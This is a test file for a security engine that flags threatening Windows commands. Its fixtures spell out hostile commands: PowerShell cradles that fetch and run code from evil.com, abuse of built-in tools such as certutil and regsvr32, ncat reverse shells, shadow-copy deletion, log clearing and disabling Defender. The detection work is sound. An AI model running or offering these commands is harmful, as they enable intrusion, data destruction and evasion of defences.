import { beforeAll, describe, expect, it } from "vitest";
import type { HeuristicsEngine } from "../heuristics.js";
import { createMatcher, loadEngine } from "./test-helper.js";

const matchCommand = createMatcher("command");

describe("Windows command threats", () => {
	let engine: HeuristicsEngine;

	beforeAll(async () => {
		engine = await loadEngine();
	});

	// --- PowerShell Download-Execute (WIN-CMD-001) ---

	it("detects irm | iex", () => {
		expect(matchCommand(engine, "irm https://evil.com/install.ps1 | iex")).toContain(
			"CLT-WIN-CMD-001",
		);
	});

	it("detects iwr | iex", () => {
		expect(matchCommand(engine, "iwr https://evil.com/payload.ps1 | iex")).toContain(
			"CLT-WIN-CMD-001",
		);
	});

	it("detects Invoke-WebRequest | Invoke-Expression", () => {
		expect(
			matchCommand(engine, "Invoke-WebRequest https://evil.com/s.ps1 | Invoke-Expression"),
		).toContain("CLT-WIN-CMD-001");
	});

	it("detects Invoke-RestMethod | Invoke-Expression", () => {
		expect(
			matchCommand(engine, "Invoke-RestMethod https://evil.com/s.ps1 | Invoke-Expression"),
		).toContain("CLT-WIN-CMD-001");
	});

	it("detects curl | iex (PS alias)", () => {
		expect(matchCommand(engine, "curl https://evil.com/install.ps1 | iex")).toContain(
			"CLT-WIN-CMD-001",
		);
	});

	it("detects wget | iex (PS alias)", () => {
		expect(matchCommand(engine, "wget https://evil.com/install.ps1 | iex")).toContain(
			"CLT-WIN-CMD-001",
		);
	});

	// --- IEX wrapping download (WIN-CMD-002) ---

	it("detects iex(irm url)", () => {
		expect(matchCommand(engine, "iex(irm https://evil.com/s.ps1)")).toContain("CLT-WIN-CMD-002");
	});

	it("detects IEX((New-Object Net.WebClient).DownloadString(url))", () => {
		expect(
			matchCommand(
				engine,
				"IEX((New-Object Net.WebClient).DownloadString('https://evil.com/s.ps1'))",
			),
		).toContain("CLT-WIN-CMD-002");
	});

	it("detects iex(iwr url)", () => {
		expect(matchCommand(engine, "iex(iwr https://evil.com/s.ps1)")).toContain("CLT-WIN-CMD-002");
	});

	// --- Start-Process (WIN-CMD-003) ---

	it("detects Start-Process with exe", () => {
		expect(matchCommand(engine, "Start-Process -FilePath malware.exe")).toContain(
			"CLT-WIN-CMD-003",
		);
	});

	it("detects Start-Process with ps1", () => {
		expect(matchCommand(engine, "Start-Process -FilePath payload.ps1")).toContain(
			"CLT-WIN-CMD-003",
		);
	});

	// --- Download then execute chain (WIN-CMD-004) ---

	it("detects curl -o file.cmd && execute", () => {
		expect(
			matchCommand(
				engine,
				"curl -fsSL https://evil.com/install.cmd -o install.cmd && install.cmd && del install.cmd",
			),
		).toContain("CLT-WIN-CMD-004");
	});

	it("detects iwr -OutFile then semicolon execute", () => {
		expect(matchCommand(engine, "iwr https://evil.com/s.ps1 -OutFile s.ps1; .\\s.ps1")).toContain(
			"CLT-WIN-CMD-004",
		);
	});

	// --- .NET WebClient (WIN-CMD-005) ---

	it("detects New-Object Net.WebClient DownloadString", () => {
		expect(
			matchCommand(engine, "(New-Object Net.WebClient).DownloadString('https://evil.com/s.ps1')"),
		).toContain("CLT-WIN-CMD-005");
	});

	it("detects New-Object Net.WebClient DownloadFile", () => {
		expect(
			matchCommand(
				engine,
				"(New-Object Net.WebClient).DownloadFile('https://evil.com/m.exe','m.exe')",
			),
		).toContain("CLT-WIN-CMD-005");
	});

	// --- Start-BitsTransfer (WIN-CMD-006) ---

	it("detects Start-BitsTransfer", () => {
		expect(
			matchCommand(
				engine,
				"Start-BitsTransfer -Source https://evil.com/payload.exe -Destination C:\\temp\\payload.exe",
			),
		).toContain("CLT-WIN-CMD-006");
	});

	// --- LOLBins ---

	it("detects certutil -urlcache (WIN-CMD-007)", () => {
		expect(
			matchCommand(engine, "certutil -urlcache -f https://evil.com/payload.exe payload.exe"),
		).toContain("CLT-WIN-CMD-007");
	});

	it("detects certutil -decode (WIN-CMD-007)", () => {
		expect(matchCommand(engine, "certutil -decode encoded.b64 payload.exe")).toContain(
			"CLT-WIN-CMD-007",
		);
	});

	it("detects bitsadmin /transfer (WIN-CMD-008)", () => {
		expect(
			matchCommand(
				engine,
				"bitsadmin /transfer myJob https://evil.com/payload.exe C:\\temp\\payload.exe",
			),
		).toContain("CLT-WIN-CMD-008");
	});

	it("detects mshta remote HTA (WIN-CMD-009)", () => {
		expect(matchCommand(engine, "mshta https://evil.com/payload.hta")).toContain("CLT-WIN-CMD-009");
	});

	it("detects regsvr32 scriptlet (WIN-CMD-010)", () => {
		expect(
			matchCommand(engine, "regsvr32 /s /i:https://evil.com/payload.sct scrobj.dll"),
		).toContain("CLT-WIN-CMD-010");
	});

	it("detects rundll32 javascript (WIN-CMD-011)", () => {
		expect(
			matchCommand(engine, 'rundll32 javascript:"\\..\\mshtml,RunHTMLApplication";alert(1)'),
		).toContain("CLT-WIN-CMD-011");
	});

	it("detects cmstp INF (WIN-CMD-012)", () => {
		expect(matchCommand(engine, "cmstp /au /s evil.inf")).toContain("CLT-WIN-CMD-012");
	});

	it("detects wmic process call create (WIN-CMD-013)", () => {
		expect(matchCommand(engine, 'wmic process call create "cmd /c malware.exe"')).toContain(
			"CLT-WIN-CMD-013",
		);
	});

	it("detects msiexec remote (WIN-CMD-014)", () => {
		expect(matchCommand(engine, "msiexec /q /i https://evil.com/pkg.msi")).toContain(
			"CLT-WIN-CMD-014",
		);
	});

	it("detects forfiles /c cmd (WIN-CMD-015)", () => {
		expect(matchCommand(engine, 'forfiles /c "cmd /c payload.exe"')).toContain("CLT-WIN-CMD-015");
	});

	it("detects pcalua -a (WIN-CMD-016)", () => {
		expect(matchCommand(engine, "pcalua -a malware.exe")).toContain("CLT-WIN-CMD-016");
	});

	it("detects installutil (WIN-CMD-017)", () => {
		expect(matchCommand(engine, "installutil /logfile= /logtoconsole=false payload.dll")).toContain(
			"CLT-WIN-CMD-017",
		);
	});

	it("detects regasm /u (WIN-CMD-018)", () => {
		expect(matchCommand(engine, "regasm /u payload.dll")).toContain("CLT-WIN-CMD-018");
	});

	it("detects regsvcs (WIN-CMD-018)", () => {
		expect(matchCommand(engine, "regsvcs payload.dll")).toContain("CLT-WIN-CMD-018");
	});

	// --- Destructive operations ---

	it("detects format C: (WIN-CMD-019)", () => {
		expect(matchCommand(engine, "format C:")).toContain("CLT-WIN-CMD-019");
	});

	it("detects rd /s /q C:\\ (WIN-CMD-020)", () => {
		expect(matchCommand(engine, "rd /s /q C:\\")).toContain("CLT-WIN-CMD-020");
	});

	it("detects del /f /s /q C:\\ (WIN-CMD-021)", () => {
		expect(matchCommand(engine, "del /f /s /q C:\\")).toContain("CLT-WIN-CMD-021");
	});

	it("detects diskpart (WIN-CMD-022)", () => {
		expect(matchCommand(engine, "diskpart")).toContain("CLT-WIN-CMD-022");
	});

	// --- Reverse shells ---

	it("detects PS TCP reverse shell (WIN-CMD-023)", () => {
		expect(
			matchCommand(engine, "New-Object System.Net.Sockets.TcpClient('10.0.0.1',4444)"),
		).toContain("CLT-WIN-CMD-023");
	});

	it("detects PS UDP reverse shell (WIN-CMD-024)", () => {
		expect(
			matchCommand(engine, "New-Object System.Net.Sockets.UdpClient('10.0.0.1',4444)"),
		).toContain("CLT-WIN-CMD-024");
	});

	// --- Privilege escalation ---

	it("detects runas /user: (WIN-CMD-025)", () => {
		expect(matchCommand(engine, "runas /user:Administrator cmd.exe")).toContain("CLT-WIN-CMD-025");
	});

	it("detects Set-ExecutionPolicy Bypass (WIN-CMD-026)", () => {
		expect(matchCommand(engine, "Set-ExecutionPolicy Bypass")).toContain("CLT-WIN-CMD-026");
	});

	it("detects Set-ExecutionPolicy Unrestricted (WIN-CMD-026)", () => {
		expect(matchCommand(engine, "Set-ExecutionPolicy Unrestricted")).toContain("CLT-WIN-CMD-026");
	});

	it("detects fodhelper (WIN-CMD-027)", () => {
		expect(matchCommand(engine, "fodhelper")).toContain("CLT-WIN-CMD-027");
	});

	// --- PowerShell Destructive Operations (028-029) ---

	it("detects Remove-Item -Recurse -Force (WIN-CMD-028)", () => {
		expect(matchCommand(engine, "Remove-Item C:\\Users\\Public -Recurse -Force")).toContain(
			"CLT-WIN-CMD-028",
		);
	});

	it("detects Remove-Item -Force -Recurse (reversed flags) (WIN-CMD-028)", () => {
		expect(matchCommand(engine, "Remove-Item C:\\temp -Force -Recurse")).toContain(
			"CLT-WIN-CMD-028",
		);
	});

	it("detects Clear-RecycleBin -Force (WIN-CMD-029)", () => {
		expect(matchCommand(engine, "Clear-RecycleBin -Force")).toContain("CLT-WIN-CMD-029");
	});

	// --- Additional Reverse Shells (030) ---

	it("detects ncat -e cmd (WIN-CMD-030)", () => {
		expect(matchCommand(engine, "ncat 10.0.0.1 4444 -e cmd")).toContain("CLT-WIN-CMD-030");
	});

	it("detects ncat -e powershell.exe (WIN-CMD-030)", () => {
		expect(matchCommand(engine, "ncat 10.0.0.1 4444 -e powershell.exe")).toContain(
			"CLT-WIN-CMD-030",
		);
	});

	// --- Shadow Copy / Recovery Destruction (031-034) ---

	it("detects vssadmin delete shadows (WIN-CMD-031)", () => {
		expect(matchCommand(engine, "vssadmin delete shadows /all /quiet")).toContain(
			"CLT-WIN-CMD-031",
		);
	});

	it("detects vssadmin Delete Shadows mixed case (WIN-CMD-031)", () => {
		expect(matchCommand(engine, "vssadmin Delete Shadows /All")).toContain("CLT-WIN-CMD-031");
	});

	it("detects wmic shadowcopy delete (WIN-CMD-032)", () => {
		expect(matchCommand(engine, "wmic shadowcopy delete")).toContain("CLT-WIN-CMD-032");
	});

	it("detects bcdedit recovery disable (WIN-CMD-033)", () => {
		expect(matchCommand(engine, "bcdedit /set {default} recoveryenabled No")).toContain(
			"CLT-WIN-CMD-033",
		);
	});

	it("detects PowerShell WMI shadow copy deletion (WIN-CMD-034)", () => {
		expect(
			matchCommand(engine, "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }"),
		).toContain("CLT-WIN-CMD-034");
	});

	it("detects PowerShell CIM shadow copy deletion (WIN-CMD-034)", () => {
		expect(matchCommand(engine, "Get-CimInstance Win32_ShadowCopy | Remove-CimInstance")).toContain(
			"CLT-WIN-CMD-034",
		);
	});

	// --- Defense Evasion / Anti-Forensics (035-039) ---

	it("detects wevtutil cl Security (WIN-CMD-035)", () => {
		expect(matchCommand(engine, "wevtutil cl Security")).toContain("CLT-WIN-CMD-035");
	});

	it("detects wevtutil clear-log (WIN-CMD-035)", () => {
		expect(matchCommand(engine, "wevtutil clear-log Application")).toContain("CLT-WIN-CMD-035");
	});

	it("detects Clear-EventLog (WIN-CMD-036)", () => {
		expect(matchCommand(engine, "Clear-EventLog -LogName Security")).toContain("CLT-WIN-CMD-036");
	});

	it("detects Remove-EventLog (WIN-CMD-036)", () => {
		expect(matchCommand(engine, "Remove-EventLog -LogName MyLog")).toContain("CLT-WIN-CMD-036");
	});

	it("detects Set-MpPreference -DisableRealtimeMonitoring (WIN-CMD-037)", () => {
		expect(matchCommand(engine, "Set-MpPreference -DisableRealtimeMonitoring $true")).toContain(
			"CLT-WIN-CMD-037",
		);
	});

	it("detects sc stop WinDefend (WIN-CMD-038)", () => {
		expect(matchCommand(engine, "sc stop WinDefend")).toContain("CLT-WIN-CMD-038");
	});

	it("detects net stop MpsSvc (WIN-CMD-038)", () => {
		expect(matchCommand(engine, "net stop MpsSvc")).toContain("CLT-WIN-CMD-038");
	});

	it("detects Stop-Service SecurityHealthService (WIN-CMD-038)", () => {
		expect(matchCommand(engine, "Stop-Service SecurityHealthService")).toContain("CLT-WIN-CMD-038");
	});

	it("detects netsh advfirewall state off (WIN-CMD-039)", () => {
		expect(matchCommand(engine, "netsh advfirewall set allprofiles state off")).toContain(
			"CLT-WIN-CMD-039",
		);
	});

	// --- Data Exfiltration Indicators (040-041) ---

	it("detects rar -p (password archive) (WIN-CMD-040)", () => {
		expect(matchCommand(engine, "rar a -pSECRET archive.rar C:\\Users\\docs\\*")).toContain(
			"CLT-WIN-CMD-040",
		);
	});

	it("detects 7z -p (password archive) (WIN-CMD-040)", () => {
		expect(matchCommand(engine, "7z a -pMyPassword exfil.7z C:\\secrets")).toContain(
			"CLT-WIN-CMD-040",
		);
	});

	it("detects zip --password (WIN-CMD-040)", () => {
		expect(matchCommand(engine, "zip --password SECRET archive.zip file.txt")).toContain(
			"CLT-WIN-CMD-040",
		);
	});

	it("detects bulk *.docx archiving (WIN-CMD-041)", () => {
		expect(matchCommand(engine, "7z a docs.7z C:\\Users\\*.docx")).toContain("CLT-WIN-CMD-041");
	});

	it("detects bulk *.xlsx archiving (WIN-CMD-041)", () => {
		expect(matchCommand(engine, "rar a spreadsheets.rar D:\\Share\\*.xlsx")).toContain(
			"CLT-WIN-CMD-041",
		);
	});

	it("detects bulk *.pdf archiving (WIN-CMD-041)", () => {
		expect(matchCommand(engine, "zip reports.zip C:\\Reports\\*.pdf")).toContain("CLT-WIN-CMD-041");
	});

	it("detects password + document wildcard combo (WIN-CMD-040+041)", () => {
		const ids = matchCommand(engine, "7z a -pSECRET exfil.7z C:\\Users\\*.docx");
		expect(ids).toContain("CLT-WIN-CMD-040");
		expect(ids).toContain("CLT-WIN-CMD-041");
	});

	// --- AutoIt3 Script Execution (042) ---

	it("detects AutoIt3ExecuteScript (WIN-CMD-042)", () => {
		expect(
			matchCommand(
				engine,
				'"C:\\Google\\AutoIt3.exe" /AutoIt3ExecuteScript C:\\Google\\googleupdate.a3x',
			),
		).toContain("CLT-WIN-CMD-042");
	});

	it("detects renamed AutoIt3 binary (WIN-CMD-042)", () => {
		expect(
			matchCommand(
				engine,
				'"C:\\GoogleChrome\\GoogleChrome.exe" /AutoIt3ExecuteScript C:\\GoogleChrome\\GoogleChrome.a3x',
			),
		).toContain("CLT-WIN-CMD-042");
	});

	it("detects cmd start + AutoIt3 (WIN-CMD-042)", () => {
		expect(
			matchCommand(
				engine,
				'"C:\\Windows\\System32\\cmd.exe" /c start C:\\streamer\\streamer.exe /AutoIt3ExecuteScript "C:\\streamer\\stream.txt" & exit',
			),
		).toContain("CLT-WIN-CMD-042");
	});

	it("detects case-insensitive AutoIt3 flag (WIN-CMD-042)", () => {
		expect(matchCommand(engine, "Setup.exe /autoit3executescript c.a3x")).toContain(
			"CLT-WIN-CMD-042",
		);
	});

	// --- Script execution from C:\Users\Public (043) ---

	it("detects wscript from Users\\Public (WIN-CMD-043)", () => {
		expect(matchCommand(engine, 'wscript.exe "C:\\Users\\Public\\Controller\\zakec.js"')).toContain(
			"CLT-WIN-CMD-043",
		);
	});

	it("detects cscript from Users\\Public (WIN-CMD-043)", () => {
		expect(matchCommand(engine, 'cscript.exe "C:\\Users\\Public\\Music\\TvMusic.vbs"')).toContain(
			"CLT-WIN-CMD-043",
		);
	});

	it("detects WScript.exe from Users\\Public\\Documents (WIN-CMD-043)", () => {
		expect(
			matchCommand(
				engine,
				"C:\\Windows\\System32\\wscript.exe C:\\Users\\Public\\Documents\\uqeyi\\osuvi.js",
			),
		).toContain("CLT-WIN-CMD-043");
	});

	it("does not match wscript from normal path (WIN-CMD-043 neg)", () => {
		const ids = matchCommand(engine, 'wscript.exe "C:\\Program Files\\App\\script.vbs"');
		expect(ids.filter((id) => id === "CLT-WIN-CMD-043")).toEqual([]);
	});

	// --- regsvr32 Squiblydoo with remote URL (044) ---

	it("detects regsvr32 /i:shellcode,https:// (WIN-CMD-044)", () => {
		expect(
			matchCommand(
				engine,
				"regsvr32.exe /s /i:shellcode,https://gist.githubusercontent.com/evil/raw/ssl C:\\Users\\Public\\Music\\bin\\64.dll",
			),
		).toContain("CLT-WIN-CMD-044");
	});

	it("detects regsvr32 /i:http:// (WIN-CMD-044)", () => {
		expect(
			matchCommand(engine, "regsvr32 /s /i:http://evil.test/payload.sct scrobj.dll"),
		).toContain("CLT-WIN-CMD-044");
	});

	it("does not match regsvr32 /s normal DLL (WIN-CMD-044 neg)", () => {
		const ids = matchCommand(engine, 'regsvr32.exe /s "C:\\Program Files\\App\\control.dll"');
		expect(ids.filter((id) => id === "CLT-WIN-CMD-044")).toEqual([]);
	});

	// --- cmdl32.exe LOLBin (045) ---

	it("detects cmdl32.exe (WIN-CMD-045)", () => {
		expect(
			matchCommand(
				engine,
				'"C:\\Windows\\System32\\cmdl32.exe" /VPN "C:\\ProgramData\\Microsoft\\Network\\Connections\\Cm\\vpn1.cmp"',
			),
		).toContain("CLT-WIN-CMD-045");
	});

	// --- Download then start via single & (046) ---

	it("detects curl --output + start chain (WIN-CMD-046)", () => {
		expect(
			matchCommand(
				engine,
				"cmd /c curl http://evil.test/a.exe --output C:\\Users\\Public\\a.exe & start C:\\Users\\Public\\a.exe",
			),
		).toContain("CLT-WIN-CMD-046");
	});

	it("detects curl -o + start chain (WIN-CMD-046)", () => {
		expect(
			matchCommand(
				engine,
				"curl http://evil.test/payload.exe -o C:\\temp\\p.exe & start C:\\temp\\p.exe",
			),
		).toContain("CLT-WIN-CMD-046");
	});

	it("detects wget --output + start chain (WIN-CMD-046)", () => {
		expect(
			matchCommand(
				engine,
				"wget http://evil.test/m.exe --output C:\\Users\\Public\\m.exe & start C:\\Users\\Public\\m.exe",
			),
		).toContain("CLT-WIN-CMD-046");
	});

	it("does not match curl without start (WIN-CMD-046 neg)", () => {
		const ids = matchCommand(engine, "curl http://example.com/data.json --output data.json");
		expect(ids.filter((id) => id === "CLT-WIN-CMD-046")).toEqual([]);
	});

	// --- Negative cases ---

	it("does not match Get-Help", () => {
		const ids = matchCommand(engine, "Get-Help Invoke-WebRequest");
		expect(ids.filter((id) => id.startsWith("CLT-WIN-CMD"))).toEqual([]);
	});

	it("does not match simple dir command", () => {
		const ids = matchCommand(engine, "dir C:\\Users");
		expect(ids.filter((id) => id.startsWith("CLT-WIN-CMD"))).toEqual([]);
	});

	it("does not match normal curl to file without execute", () => {
		const ids = matchCommand(engine, "curl -o output.txt https://example.com/data.json");
		expect(ids.filter((id) => id === "CLT-WIN-CMD-004")).toEqual([]);
	});

	it("does not match Get-Process", () => {
		const ids = matchCommand(engine, "Get-Process | Where-Object { $_.CPU -gt 100 }");
		expect(ids.filter((id) => id.startsWith("CLT-WIN-CMD"))).toEqual([]);
	});

	it("does not match vssadmin list shadows", () => {
		const ids = matchCommand(engine, "vssadmin list shadows");
		expect(ids.filter((id) => id === "CLT-WIN-CMD-031")).toEqual([]);
	});

	it("does not match wevtutil qe (query)", () => {
		const ids = matchCommand(engine, "wevtutil qe Security /c:10");
		expect(ids.filter((id) => id === "CLT-WIN-CMD-035")).toEqual([]);
	});

	it("does not match 7z without password (normal archive)", () => {
		const ids = matchCommand(engine, "7z a archive.7z src/");
		expect(ids.filter((id) => id === "CLT-WIN-CMD-040")).toEqual([]);
	});

	it("does not match sc query WinDefend (status check)", () => {
		const ids = matchCommand(engine, "sc query WinDefend");
		expect(ids.filter((id) => id === "CLT-WIN-CMD-038")).toEqual([]);
	});

	// --- Additional FP coverage ---

	it("does not match Start-Process without executable extension (003 FP)", () => {
		const ids = matchCommand(engine, 'Start-Process -FilePath "notepad"');
		expect(ids).not.toContain("CLT-WIN-CMD-003");
	});

	it("does not match Get-BitsTransfer (006 FP)", () => {
		const ids = matchCommand(engine, "Get-BitsTransfer");
		expect(ids).not.toContain("CLT-WIN-CMD-006");
	});

	it("does not match Format-Table (019 FP)", () => {
		const ids = matchCommand(engine, "Format-Table -Property Name,Value");
		expect(ids).not.toContain("CLT-WIN-CMD-019");
	});

	it("does not match Set-ExecutionPolicy RemoteSigned (026 FP)", () => {
		const ids = matchCommand(engine, "Set-ExecutionPolicy RemoteSigned");
		expect(ids).not.toContain("CLT-WIN-CMD-026");
	});

	it("does not match Get-ExecutionPolicy (026 FP)", () => {
		const ids = matchCommand(engine, "Get-ExecutionPolicy");
		expect(ids).not.toContain("CLT-WIN-CMD-026");
	});

	it("does not match Remove-Item without -Recurse -Force (028 FP)", () => {
		const ids = matchCommand(engine, "Remove-Item -Path .\\temp.txt");
		expect(ids).not.toContain("CLT-WIN-CMD-028");
	});

	it("does not match Clear-RecycleBin without -Force (029 FP)", () => {
		const ids = matchCommand(engine, "Clear-RecycleBin");
		expect(ids).not.toContain("CLT-WIN-CMD-029");
	});

	it("does not match bcdedit /enum (033 FP)", () => {
		const ids = matchCommand(engine, "bcdedit /enum");
		expect(ids).not.toContain("CLT-WIN-CMD-033");
	});

	it("does not match Get-MpPreference (037 FP)", () => {
		const ids = matchCommand(engine, "Get-MpPreference");
		expect(ids).not.toContain("CLT-WIN-CMD-037");
	});

	it("does not match 7z archiving non-document wildcards (041 FP)", () => {
		const ids = matchCommand(engine, "7z a backup.7z src/*.json");
		expect(ids).not.toContain("CLT-WIN-CMD-041");
	});

	it("does not match zip without password for normal files (040 FP)", () => {
		const ids = matchCommand(engine, "zip archive.zip src/*.ts");
		expect(ids).not.toContain("CLT-WIN-CMD-040");
	});

	it("does not match netsh advfirewall show (039 FP)", () => {
		const ids = matchCommand(engine, "netsh advfirewall show allprofiles state");
		expect(ids).not.toContain("CLT-WIN-CMD-039");
	});

	it("does not match Get-EventLog (036 FP)", () => {
		const ids = matchCommand(engine, "Get-EventLog -LogName Application -Newest 10");
		expect(ids).not.toContain("CLT-WIN-CMD-036");
	});

	// --- Shadow copy/VSS/backup destruction (WIN-CMD-047) ---

	it("detects vssadmin resize shadowstorage (WIN-CMD-047)", () => {
		expect(
			matchCommand(engine, "vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB"),
		).toContain("CLT-WIN-CMD-047");
	});

	it("detects wbadmin delete catalog (WIN-CMD-047)", () => {
		expect(matchCommand(engine, "wbadmin delete catalog -quiet")).toContain("CLT-WIN-CMD-047");
	});

	it("detects VSS service disable via reg (WIN-CMD-047)", () => {
		expect(
			matchCommand(
				engine,
				"reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\VSS /v Start /t REG_DWORD /d 4 /f",
			),
		).toContain("CLT-WIN-CMD-047");
	});

	// --- Firewall manipulation (WIN-CMD-048/049) ---

	it("detects legacy netsh firewall opmode DISABLE (WIN-CMD-048)", () => {
		expect(matchCommand(engine, "netsh firewall set opmode mode=DISABLE")).toContain(
			"CLT-WIN-CMD-048",
		);
	});

	it("detects netsh advfirewall add rule (WIN-CMD-049)", () => {
		expect(
			matchCommand(
				engine,
				"netsh advfirewall firewall add rule name=backdoor program=C:\\evil.exe action=allow",
			),
		).toContain("CLT-WIN-CMD-049");
	});

	// --- LOLBins (WIN-CMD-050..055) ---

	it("detects regsvr32 /i:http (WIN-CMD-050)", () => {
		expect(
			matchCommand(engine, "regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll"),
		).toContain("CLT-WIN-CMD-050");
	});

	it("detects Mavinject64.exe (WIN-CMD-051)", () => {
		expect(
			matchCommand(engine, "C:\\Windows\\Mavinject64.exe 1234 /INJECTRUNNING evil.dll"),
		).toContain("CLT-WIN-CMD-051");
	});

	it("detects inject_dll_x86.exe (WIN-CMD-052)", () => {
		expect(matchCommand(engine, "C:\\tools\\inject_dll_x86.exe")).toContain("CLT-WIN-CMD-052");
	});

	it("detects PowerShdll.dll (WIN-CMD-053)", () => {
		expect(matchCommand(engine, "rundll32.exe PowerShdll.dll,main")).toContain("CLT-WIN-CMD-053");
	});

	it("detects SyncAppvPublishingServer iex (WIN-CMD-054)", () => {
		expect(matchCommand(engine, 'SyncAppvPublishingServer.vbs "Break; iex cmd"')).toContain(
			"CLT-WIN-CMD-054",
		);
	});

	it("detects sdclt.exe UAC bypass (WIN-CMD-055)", () => {
		expect(matchCommand(engine, "sdclt.exe")).toContain("CLT-WIN-CMD-055");
	});

	// --- PowerShell techniques (WIN-CMD-056..061) ---

	it("detects powershell iex $env (WIN-CMD-056)", () => {
		expect(matchCommand(engine, "powershell iex $env:comspec")).toContain("CLT-WIN-CMD-056");
	});

	it("detects powershell -Version downgrade (WIN-CMD-057)", () => {
		expect(matchCommand(engine, "powershell -Version 2 -Command Get-Process")).toContain(
			"CLT-WIN-CMD-057",
		);
	});

	it("detects powershell iex downloadstring cradle (WIN-CMD-058)", () => {
		expect(
			matchCommand(
				engine,
				"powershell iex (New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')",
			),
		).toContain("CLT-WIN-CMD-058");
	});

	it("detects powershell Reflection.Assembly Load (WIN-CMD-059)", () => {
		expect(matchCommand(engine, "powershell [Reflection.Assembly]::Load($bytes)")).toContain(
			"CLT-WIN-CMD-059",
		);
	});

	it("detects powershell cert validation bypass (WIN-CMD-060)", () => {
		expect(
			matchCommand(
				engine,
				"powershell [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }",
			),
		).toContain("CLT-WIN-CMD-060");
	});

	it("detects powershell GetTypeFromCLSID (WIN-CMD-061)", () => {
		expect(
			matchCommand(
				engine,
				"powershell [Type]::GetTypeFromCLSID('72C24DD5-D70A-438B-8A42-98424B88AFB8')",
			),
		).toContain("CLT-WIN-CMD-061");
	});

	// --- Extended bcdedit/recovery (WIN-CMD-033 merge) ---

	it("detects bcdedit bootems off (WIN-CMD-033)", () => {
		expect(matchCommand(engine, "bcdedit /set bootems off")).toContain("CLT-WIN-CMD-033");
	});

	it("detects reg delete SafeBoot (WIN-CMD-033)", () => {
		expect(
			matchCommand(engine, "reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot /f"),
		).toContain("CLT-WIN-CMD-033");
	});

	it("detects reg add Winlogon Userinit (WIN-CMD-033)", () => {
		expect(
			matchCommand(
				engine,
				"reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit /d evil.exe",
			),
		).toContain("CLT-WIN-CMD-033");
	});

	// --- Extended Defender settings (WIN-CMD-037 merge) ---

	it("detects Add-MpPreference -Exclusion (WIN-CMD-037)", () => {
		expect(matchCommand(engine, "Add-MpPreference -ExclusionPath C:\\malware")).toContain(
			"CLT-WIN-CMD-037",
		);
	});
});
